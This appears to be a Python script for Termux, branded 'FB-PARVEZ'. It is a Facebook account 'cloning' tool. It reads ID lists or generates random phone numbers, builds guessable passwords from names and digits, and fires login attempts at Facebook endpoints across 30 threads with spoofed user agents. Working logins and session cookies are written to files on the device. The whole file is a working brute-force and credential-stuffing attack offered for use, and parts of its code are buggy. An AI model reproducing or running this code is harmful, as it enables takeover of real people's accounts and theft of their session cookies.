###----------[ IMPORT MODULE ]----------###
from os import path
from os import system as Love_Tisha
import requests,json,os,sys,random,datetime,time,re,platform,string,uuid,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from time import time as mek
from bs4 import BeautifulSoup as sop
import os,base64,zlib,pip,urllib,random, requests
try: 
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
if not len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines())==1034:print('')
###----------[ GLOBAL NAMA ]----------###

id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
usragent = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ugen=[]
##------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/FBIOS;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Djezzy]",]
ua = ["Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; Nokia XR21 Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2409 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]",]
ua = ["Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRIFAT')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(1000, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
 
 
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(1000, 9999)
	c=random.randrange(1000, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 
 
 
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/R4G3-F14M3/Ua.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
###----------[ PEH ]----------###
mer = '\033[38;5;208m'
kun = '\033[38;5;208m'
hijo = '\033[38;5;208m'
biru = '\033[38;5;208m'
ung = '\033[38;5;208m'
puti = '\033[38;5;208m'
bira = '\033[38;5;208m'
xxx = '\033[38;5;208m'
GREEN ='\33[1;32m'
RED = '\033[38;5;208m'
WHITE = '\33[1;37m'
YELLOW = '\033[38;5;208m'
BLUE = '\033[38;5;208m'
ORANGE = '\033[38;5;208m'
BLACK="\33[1;37m"
R = '\33[0;34m' 
G = '\33[0;36m' 
Y = '\033[38;5;208m' 
Q = '\33[1;34m'
T = '\033[38;5;208m'
x = '\33[1;34m' 
P = '\33[1;37m'
M = '\33[0;32m' 
H = '\33[1;32m'
K = '\33[1;31m'
B = '\033[38;5;208m'
U = '\033[38;5;208m'
O = '\033[38;5;208m'
N = '\033[38;5;208m'
A = '\033[38;5;208m'
BN = '\033[38;5;208m'
BBL = '\033[38;5;208m'
BP = '\033[38;5;208m'
BB = '\033[38;5;208m'
BK = '\033[38;5;208m'
BH = '\033[38;5;208m'
BM = '\033[38;5;208m'
BA = '\033[38;5;208m'
my_color = [
 G, G, G, G, G, G, G, G]
warna = random.choice(my_color)
###----------[ CONVERT LINE ]----------###
#led = f'═════════════════════════════════════════════════'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}-{K}] {P}'
dot=f' {K}[{WHITE}💚{K}] {P}'
rdd=f' {K}[{RED}-{K}] {P}'
rgen=f' {K}[{RED}-{K}] {P}'
wt=f' {K}[{GREEN}!{K}] {P}'
#fst=f'{dot}[{H}sathi{M}={H}abir{M}={H}tisha{M}={H}mahin{M}={H}samim{P}]'
#lst=f'{dot}[{H}akter{M}={H}khan{M}={H}hasan{M}={H}ahmed{M}={H}ali{P}]'
limitt=f'{dot}EXAMPLE [{H}5000{M}-{H}10000{M}-{H}20000{M}-{H}40000{P}]'
c7=f'{dot}EXAMPLE [{H}{M}{H}0177{M}-{H}0161{M}-{H}0176{M}-{H}0196{M}-{H}0179{P}]'
#c6=f'{dot}EXAMPLE [{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
#c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
mtd,cp_xdx,cokix=[],[],[]
def clear():
 os.system('clear')
def banner():
    #os.system('clear')
    print(f""" \033[38;5;46m

    LOGO LAGAI NIYO
\033[38;5;195m╔════════════════════════════════════════════════════╗
\033[38;5;195m║ \033[38;5;46mPARVEZ AHMED \033[1;93m•\033[38;5;46m GITHUB TMR TA DIYO\033[1;93m•\033[38;5;46m VARSION 0.0.1\033[38;5;195m║
\033[38;5;195m╚════════════════════════════════════════════════════╝""")
def linex1():
	print('\033[38;5;195m╔════════════════════════════════════════════════════╗')
def linex2():
	print('\033[38;5;195m╚════════════════════════════════════════════════════╝')
def linex3():
	print('\033[38;5;195m══════════════════════════════════════════════════════')

c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')

c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')
#
#
gffff=('FB-')
kffff=('PARVEZ')
c0=('ht')
c4=('tps://')
c1=('tinyurl')
c2=('.com/')
c3=('2n8sj2p4')
cu=('Ki')
cuu=('ngcy')
cuuu=('ber')

def mainx():
    clear();banner()
    linex1()
    print(f"{K} [{H}1{K}] {WHITE}FILE   CLONING ")
    print(f"{K} [{H}2{K}] {WHITE}RANDOM CLONING")   
    print(f"{K} [{M}0{K}] {WHITE}EXIT TOOLS ")
    linex2()
    mahin = input(f'{wt}SELECT MENU {M}:{H} ')
    if mahin in ["0","07"]:
        exit()
    elif mahin in ["6","09"]:
        exit()
    elif mahin in ["1","01"]:
        cr()
    elif mahin in ["2","02"]:
        mainx2()
    elif mahin in ["5","05"]:
        sep()
    elif mahin in ["6","06"]:
     dupcutter()
    elif mahin in ["7","07"]:
     os.system("xdg-open https://github.com/FB-PARVEZ");mainx()
    elif mahin in ["3","03"]:
     os.system("xdg-open https://www.facebook.com/FB.PARVEZ.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-PARVEZ {P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.PARVEZ.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.PARVEZ.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.PARVEZ.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
    linex1()
    #print(f"{K} [{H}1{K}] {WHITE}RANDOM CLONING {H}[1]")
#    print(f"{K} [{H}2{K}] {WHITE}RANDOM CLONING {H}7 Digit ")
    print(f"{K} [{H}1{K}] {WHITE}RANDOM CLONING {H}[1]")
    #print(f"{K} [{H}4{K}] {WHITE}RANDOM CLONING {H}Pak/Ind")
    print(f"{K} [{M}0{K}] {WHITE}BACK TO MENU")
    linex2()
    mahin = input(f'{wt}SELECT MENU {M}:{H} ')
    if mahin in ["99","99"]:
        x6()
    elif mahin in ["1","01"]:
        x7()
  #  elif mahin in ["4","04"]:
        x8()
   # elif mahin in ["2","02"]:
        xp()
    elif mahin in ["0","00"]:
     mainx()
    else:
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.PARVEZ.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
#SAWYA
# FILE CRACK -- MAIN DEF #
def cr():
            os.system('clear');banner();print(f'{dot}EXAMPLE :  /sdcard/PARVEZ.txt{P}{H}{P} ');time.sleep(0.05);linex3()
            try:
                fileX = input(f"{wt}YOUR FILE NAME {RED}:{H} ")
                for line in open(fileX, 'r').readlines():
                    id.append(line.strip())
                setting()
            except IOError:
               print(f"\n{wt}{RED}File %s not found"%(fileX))
               mainx()
def setting():
    clear();banner();print(f"{dot}{P}YOUR TOTAL IDS{RED}: {H}"+str(len(id)));linex3();print(f' {K}[{H}1{K}] {P}CLONING FOR NEW IDz{H}{P}');print(f' {K}[{H}2{K}] {P}CLONING FOR MIX IDz{H}{P}');print(f' {K}[{H}3{K}] {P}CLONING FOR OLD IDz{H}{P}');linex3()
    hu = input(f'{dot}SELECT MENU {M}:{H} ')
    if hu in ['3','old']:
        for tua in sorted(id):
            id2.append(tua)       
    elif hu in ['1','new']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['2','random']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:print('Wrong try again');exit();print('')
#    print(led)
#    xd_cp=input(f'{wt}CLONING SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
#    if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')               
 #   else:cp_xdx.append('n')
    linex3()
    cokixx=input(f'{wt}CLONING SHOW COOKIE  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
    if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
    else:cokix.append('n')
    
    clear();banner();print(f"{dot}{P}TOTAL IDS {RED}: {H}"+str(len(id)));linex3();print(f' {K}[{H}1{K}] {P}CLICK ON THE [{H}ENTER {P}]');linex3()
    px=input(f'{wt}SELECT PASSWORD {M}:{H} ')
    if px in ['1','01']:p1()
#    elif px in ['2','02']:p2()
 #   elif px in ['3','03']:p3()
#    else:p4()

#FILE CLONE PASSWORD LIST #

def p1():
    os.system("clear");banner();print(f'{dot}YOUR TOTAL ID{M}  : {H}'+str(len(id)));linex3();print(f'{dot}{N}USE AIRPLANE MODE EVERY 5 MINITUE') ;linex3()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'1122');pwv.append(frs+'@123')
            else:
                if len(frs)<3:pwv.append(nmf)
                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'123456');pwv.append(frs+'12345');pwv.append(frs+'1122');pwv.append(frs+'@123')
            if 'ya' in pwpluss:
                for xpwd in pwnya:pwv.append(xpwd)
            else:pass
            if 'm1' in method:pool.submit(m1,idf,pwv)
            elif 'm2' in method:pool.submit(m2,idf,pwv)
            elif 'm3' in method:pool.submit(m3,idf,pwv)
            elif 'm4' in method:pool.submit(m4,idf,pwv)
            elif 'a1' in method:pool.submit(f1,idf,pwv)
            elif 'f1' in method:pool.submit(f1,idf,pwv)
            else:pool.submit(m5,idf,pwv)
    print('');print(f'{gen}CRACK PROCESS HAS BEEN COMPLETED');exit()

# BANGLADESH MAIN DEF#
def x7():
  user=[]
  os.system('clear');banner();print(c7);linex3()
  kode = input(f'{dot}YOUR COODE {M}: {H}');linex3();print(limitt);linex3()
  limit = int(input(f'{dot}YOUR LIMIT {M}: {H}'));linex3()
  xd_cp=input(f'{wt} CLONE CP ACCOUNT SHOW  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
  linex3()
  cokixx=input(f'{wt} CLONE SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  else:cokix.append('n')
  clear();banner();print(f"{dot}{P}NUMBER  {RED}: {H}"+kode);linex3();print(f' {K}[{H}1{K}] {P}METHOD [{H}1{P}]')
  hc = input(f'{wt}SELECT METHOD {M}:{H} ')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(7))
    user.append(nmp)
  with tred(max_workers=30) as PARVEZ_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}METHOD{RED} : {H}M-'+hc);print(f'{dot}COUNTRY CODE{RED} : {H}{kode}');print(f'{dot}LIMIT {RED} : {H}{tl}');linex3()
    for guru in user:
      idf = kode+guru
      pwv=[idf,guru,guru[1:],idf[:7],idf[:6],idf[:8]]
      if hc in ['66','088']:PARVEZ_xd.submit(m3,idf,pwv)
      elif hc in ['1','03']:PARVEZ_xd.submit(m3,idf,pwv)
  
  input(f'{dot}PRESS ENTER TO GO MENU');os.system('python fire.py')

# AITA FILE CLONE ER DEF #

def m5(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ"])
    sys.stdout.write(f'\r{P}[{animasi}{H}{P}] [{B}%s{P}]{U}- {H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
    sys.stdout.flush()
    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
    rr = random.randint
    rc = random.choice
    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
    pro = random.choice(ugen)
    for pw in pwv: 
        try:
            session = requests.Session()
            pw = pw.lower()
            get = session.get(f"https://free.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
            date = {
            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
            "email":idf,"pass":pw,"Host":"https://m.facebook.com/login/save-device/?login=source_login&ref=wizard"
         }
            respons =({
            'Host': f'p.facebook.com',
           'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5','accept-encoding': 'gzip,deflate',
           'accept-language': 'es_LA,id;q=0.9','content-length': f'{str(rr(1111,9999))}',
           'content-type': 'application/x-www-form-urlencoded','origin': 'https://m.facebook.com',
           'referer': f'https://m.facebook.com/reg/?cid=103&refid=8',
           'user-agent': pro,
           'sec-fetch-dest': f'{random.choice(["empty","document"])}',
           'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
           'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
           'sec-fetch-user': f'{random.choice(["?1","empty"])}',
           'x-requested-with': 'www.facebook.com',
           'x-xss-protection': '0',
           'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
           'sec-ch-ua-mobile': '?0'})
            yz = session.post(f'https://p.facebook.com/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
            if "checkpoint" in session.cookies.get_dict().keys():
             idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P}[\033[1;28mPARVEZ-CP{P}] \033[1;28m{idf} • {pw}{xxx}')
             open(' /sdcard/PARVEZ-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
            elif "c_user" in session.cookies.get_dict().keys():
                kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kukis)[0]
                ok+=1
                print(f'\r{P}[{H}PARVEZ-OK{P}] {GREEN}{idf} • {pw}{xxx}');linex3()
                if 'y' in cokix:
                 print(f'\r\33[1;92m[COOKIES] = {H}'+kukis);linex3()
                open(' /sdcard/PARVEZ-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
    


###----------[ AITA RANDOM ER DEF ]----------###



def m3(idf,pw):
 global loop
 global ok
 global agents
 animasi = random.choice(["\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ","\33[1;32mPARVEZ"])
 sys.stdout.write(f'\r{P}[{animasi}{H}{P}] [{B}%s{P}]{U}- -{H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
   pro = random.choice(ugen)
   free_fb = session.get(f'https://m.facebook.com').text
   log_data = {
    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
   "try_number":"0",
   "unrecognized_tries":"0",
   "email":idf,
   "pass":ps,
   "login":"Log In"}
   header_freefb = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=msILZfHl4ee_rHvaJ6JVdGWQ; sb=msILZcNkvWfWponr-aj3TT2-; wd=891x1669; dpr=2.1988937854766846; fr=0rMbm1dF319VgTCtG..BlC8L3.Mv.AAA.0.0.BlC8Mh.AWUxnI0VTaE',
    'dpr': '2',
    'referer': 'https://mbasic.facebook.com/login/?li=Q8MLZYyi6RNz_lEx7LeYW6FE&e=1348029&shbl=1&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'pro',
    'viewport-width': '980',}
   lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m[AKASH-OK] '+user+' • '+ps)
    if 'y' in cokix:
     print(f'\33[1;92m[COOKIES] = {H}'+coki)
     linex3()
    ok+=1 
    open(' /sdcard/PARVEZ-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
   elif 'checkpoint' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    coki1 = coki.split("1000")[1]
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P}[\033[1;30mPARVEZ-CP{P}] \033[1;30m{idf} • {ps}{xxx}')
    open(' /sdcard/PARVEZ-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
  
 except:
  pass 

if __name__=='__main__':
  try:os.mkdir('PARVEZ')
  except:pass
  try:os.mkdir('MEHERIN')
  except:pass
#  b2()
#  mainx() 
  mainx()
